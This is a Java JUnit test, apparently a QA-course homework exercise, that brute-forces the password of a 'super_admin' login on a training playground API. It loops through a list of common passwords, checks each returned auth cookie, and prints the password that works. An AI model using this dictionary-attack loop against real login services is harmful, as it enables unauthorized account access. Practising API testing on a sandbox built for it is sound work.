import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class EX9PasswordSelection {
    @Test
    public void testAPI() {
        List<String> passwordList = Arrays.asList("password", "123456", "2345","123456789", "qwerty", "abc123", "football", "monkey", "12345678", "letmein", "1234", "1234567890", "1234567", "12345", "dragon", "baseball", "sunshine", "iloveyou", "trustno1", "princess", "adobe123[a]", "welcome", "login", "admin", "111111", "qwerty123", "solo", "1q2w3e4r", "master", "666666", "photoshop[a]", "1qaz2wsx", "qwertyuiop", "ashley", "mustang", "121212", "starwars", "bailey", "access", "flower", "555555", "passw0rd", "shadow", "lovely", "7777777", "123123", "michael", "!@#$%^&*", "654321", "jesus", "password1", "superman", "hello", "charlie", "888888", "696969", "hottie", "freedom", "aa123456", "qazwsx", "ninja", "azerty", "loveme", "whatever", "donald", "batman", "zaq1zaq1", "000000", "123qwe");

        Map<String, Object> body = new HashMap<>();
        body.put("login","super_admin");
        body.put("password","");

        for(String tempPassword : passwordList){
            body.put("password",  tempPassword);
            Response response = RestAssured
                    .given()
                    .body(body)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();

            String auth_cookie =  response.getCookie("auth_cookie");
            Map<String,String> cookies = new HashMap<>();
            cookies.put("auth_cookie", auth_cookie);

            Response  responseCheckAuth = RestAssured
                    .given()
                    .cookies(cookies)
                    .when()
                    .get("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();

            if (responseCheckAuth.getBody().asString().equals("You are authorized")){
                System.out.println("You are authorized");
                System.out.println("password: "+tempPassword);
                break;
            }
        }
    }
}
